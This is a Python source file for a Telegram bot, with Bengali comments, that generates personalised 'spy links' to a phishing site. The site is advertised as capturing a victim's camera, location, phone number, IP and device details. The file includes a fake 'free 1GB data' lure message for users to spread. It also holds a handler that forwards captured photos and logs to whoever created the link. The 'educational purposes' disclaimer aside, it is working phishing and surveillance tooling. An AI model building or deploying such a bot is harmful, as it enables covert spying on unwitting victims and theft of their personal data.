import logging
import re
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler
import os

# --- কনফিগারেশন (এনভায়রনমেন্ট ভেরিয়েবল থেকে লোড হবে) ---
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID")
PHISHING_SITE_URL = os.environ.get("PHISHING_SITE_URL")

CHANNEL_LINK = "https://t.me/+rj4147h5OD8yMzQ9"  # আপনার চ্যানেলের লিংক
OWNER_USERNAME = "https://t.me/TheSagorOfficial"  # আপনার কন্টাক্ট ইউজারনেম

# লগিং সেটআপ
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# --- স্টার্ট কমান্ড হ্যান্ডলার ---
async def start(update: Update, context: CallbackContext) -> None:
    user = update.effective_user
    welcome_message = (
        f"Welcome, {user.first_name}!\n\n"
        "You can use this bot to generate a spy link! 🎉\n\n"
        "𝗬𝗼𝘂 𝗰𝗮𝗻 𝗛𝗮𝗰𝗸 :\n"
        "🔹 Front Camera\n"
        "🔹 Back Camera\n"
        "🔹 Location with map\n"
        "🔹 Phone number\n"
        "🔹 Sim Type\n"
        "🔹 IP, Battery, and many more\n"
        "🔹 Device type\n\n"
        "𝗡𝗼𝘁𝗲: 𝗜𝘁 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗳𝘂𝗻 𝗮𝗻𝗱 𝗲𝗱𝘂𝗰𝗮𝘁𝗶𝗼𝗻𝗮𝗹 𝗽𝘂𝗿𝗽𝗼𝘀𝗲𝘀 💡\n\n"
        "Now press create button to generate your link. 😊"
    )
    
    keyboard = [[InlineKeyboardButton("Create", callback_data='create_link')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(welcome_message, reply_markup=reply_markup)

# --- বাটন ক্লিক এবং /create কমান্ড হ্যান্ডলার ---
async def create_link_handler(update: Update, context: CallbackContext) -> None:
    # এটি বাটন ক্লিক এবং /create কমান্ড উভয় থেকেই কাজ করবে
    user_id = update.effective_user.id
    personal_link = f"{PHISHING_SITE_URL}?id={user_id}"
    
    message_text = (
        "🎉 𝗬𝗼𝘂𝗿 𝗨𝗻𝗶𝗾𝘂𝗲 𝗧𝗿𝗮𝗰𝗸𝗶𝗻𝗴 𝗟𝗶𝗻𝗸 𝗶𝘀 𝗥𝗲𝗮𝗱𝘆! 🎉\n\n"
        f"🔗 𝗬𝗼𝘂𝗿 𝗟𝗶𝗻𝗸: `{personal_link}`\n\n"
        "📝𝗡𝗼𝘁𝗲⚠\n\n"
        "->This bot 𝗨𝗥𝗟 not work complete on telegram web\n\n"
        "->So Use this 𝗨𝗥𝗟 on chrome or others browsers.✅\n\n"
        "Feel The power 💪⚡ of sagor Sheikh 😎"
    )
    
    # শেয়ার করার জন্য মেসেজ তৈরি
    share_text = (
        "🌟𝗘𝘅𝗰𝗹𝘂𝘀𝗶𝘃𝗲 𝗢𝗳𝗳𝗲𝗿: 𝗖𝗹𝗮𝗶𝗺 𝗬𝗼𝘂𝗿 𝗙𝗿𝗲𝗲 𝟭𝗚𝗕 𝗗𝗮𝘁𝗮!🌟\n\n"
        "Looking for a quick internet boost? 🎁\n"
        "Enjoy 1GB of free internet 🌍✨!\n\n"
        "✨ 𝗖𝗹𝗮𝗶𝗺 𝘆𝗼𝘂𝗿 𝗙𝗥𝗘𝗘 𝟭𝗚𝗕 𝗻𝗼𝘄! 🚀\n\n"
        f"👉𝗚𝗲𝘁 Your 𝗙𝗿𝗲𝗲 𝟭𝗚𝗕\n"
        f"👉{personal_link}\n\n"
        "Don't wait, 𝗹𝗶𝗺𝗶𝘁𝗲𝗱 𝘁𝗶𝗺𝗲 𝗼𝗳𝗳𝗲𝗿!"
    )
    # টেলিগ্রাম ফরোয়ার্ড লিংকের জন্য URL এনকোড করা
    telegram_share_url = f"https://t.me/share/url?url=&text={share_text.replace(' ', '%20').replace('\n', '%0A')}"

    # নতুন বাটনগুলো তৈরি করা
    keyboard = [
        [InlineKeyboardButton("Share this with friends", url=telegram_share_url)],
        [InlineKeyboardButton("My another Channel", url=CHANNEL_LINK)],
        [InlineKeyboardButton("Contact owner if any issue", url=OWNER_USERNAME)]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # বাটন ক্লিকের ক্ষেত্রে মেসেজ এডিট করা, /create কমান্ডের ক্ষেত্রে নতুন মেসেজ পাঠানো
    if update.callback_query:
        await update.callback_query.edit_message_text(text=message_text, reply_markup=reply_markup, parse_mode='Markdown')
    else:
        await update.message.reply_text(text=message_text, reply_markup=reply_markup, parse_mode='Markdown')

# --- মেসেজ ফিল্টারিং ইঞ্জিন (অপরিবর্তিত) ---
async def message_filter(update: Update, context: CallbackContext) -> None:
    if update.message.chat.type != 'private' or update.message.chat_id != int(ADMIN_CHAT_ID):
        return

    text = update.message.text
    photo_caption = update.message.caption
    message_content = text or photo_caption
    if not message_content:
        return

    match = re.search(r'\[student_id=(\d+)\]', message_content)
    if not match:
        return

    student_id = match.group(1)
    clean_message = re.sub(r'\[student_id=\d+\]\s*', '', message_content).strip()

    try:
        if update.message.photo:
            await context.bot.send_photo(chat_id=student_id, photo=update.message.photo[-1].file_id, caption=clean_message, parse_mode='Markdown')
            logger.info(f"Photo sent to student {student_id}")
        elif clean_message:
            await context.bot.send_message(chat_id=student_id, text=clean_message, parse_mode='Markdown')
            logger.info(f"Text log sent to student {student_id}")
            
    except Exception as e:
        logger.error(f"Failed to send message to student {student_id}. Error: {e}")
        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"⚠️ **Failed to deliver log to student `{student_id}`.** They might have blocked the bot.", parse_mode='Markdown')

# --- মূল ফাংশন ---
def main() -> None:
    application = Application.builder().token(TOKEN).build()

    # কমান্ড এবং বাটন হ্যান্ডলার যুক্ত করা
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("create", create_link_handler))
    application.add_handler(CallbackQueryHandler(create_link_handler, pattern='^create_link$'))
    
    # মেসেজ ফিল্টার হ্যান্ডলার যুক্ত করা
    application.add_handler(MessageHandler(filters.TEXT | filters.PHOTO, message_filter))

    logger.info("Bot is running...")
    application.run_polling()

if __name__ == '__main__':
    main()
